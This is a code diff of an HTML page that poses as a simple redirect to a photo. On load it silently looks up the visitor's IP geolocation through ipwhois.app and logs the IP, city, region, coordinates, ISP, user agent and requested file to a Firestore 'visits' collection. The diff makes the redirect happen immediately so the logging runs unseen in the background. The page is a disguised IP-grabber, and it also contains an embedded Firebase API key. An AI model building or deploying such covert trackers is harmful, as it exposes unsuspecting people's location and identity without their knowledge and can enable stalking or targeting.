@@ -1,11 +1,15 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
   <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-app.js";
     import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.9.0/firebase-firestore.js";
 
+    // Your Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyD2bNyLFIJUAQxNvyBxG4IVh9vN3nrSg_M",
       authDomain: "images-bfa2c.firebaseapp.com",
@@ -15,16 +19,26 @@
       appId: "1:480825008444:web:36fe42f9f447773188be39"
     };
 
+    // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const file = urlParams.get("file");
+    // Get file name from the URL path
+    const path = window.location.pathname;
+    const fileName = decodeURIComponent(path.substring(1)); // Remove leading "/"
 
-    fetch("https://ipwhois.app/json/")
-      .then(res => res.json())
-      .then(async data => {
-        const logData = {
+    if (!fileName) {
+      document.body.innerText = "No file provided.";
+    } else {
+      // Immediately start redirect
+      const redirectUrl = `nuotraukos/${encodeURIComponent(fileName)}`;
+      window.location.href = redirectUrl;
+
+      // Send logging info (in background)
+      fetch("https://ipwhois.app/json/")
+        .then(res => res.json())
+        .then(async data => {
+          const logData = {
             ip: data.ip || "Unknown",
             city: data.city || "Unknown",
             region: data.region || "Unknown",
@@ -33,27 +47,23 @@
             longitude: data.longitude || "Unknown",
             isp: data.org || "Unknown",
             userAgent: navigator.userAgent,
+            requestedFile: fileName,
             timestamp: new Date().toISOString()
-        };
+          };
 
-        try {
-          await addDoc(collection(db, "visits"), logData);
-        } catch (e) {
-          console.error("Firestore error:", e);
-        }
-
-        if (file) {
-          window.location.href = `nuotraukos/${encodeURIComponent(file)}`;
-        } else {
-          document.body.innerText = "No file provided.";
-        }
-      })
-      .catch(err => {
-        console.error("IP fetch error:", err);
-      });
+          try {
+            await addDoc(collection(db, "visits"), logData);
+          } catch (e) {
+            console.error("Firestore error:", e);
+          }
+        })
+        .catch(err => {
+          console.error("IP fetch error:", err);
+        });
+    }
   </script>
 </head>
 <body>
-  <p>Įkeliama</p>
+  <p>Redirecting...</p>
 </body>
 </html>
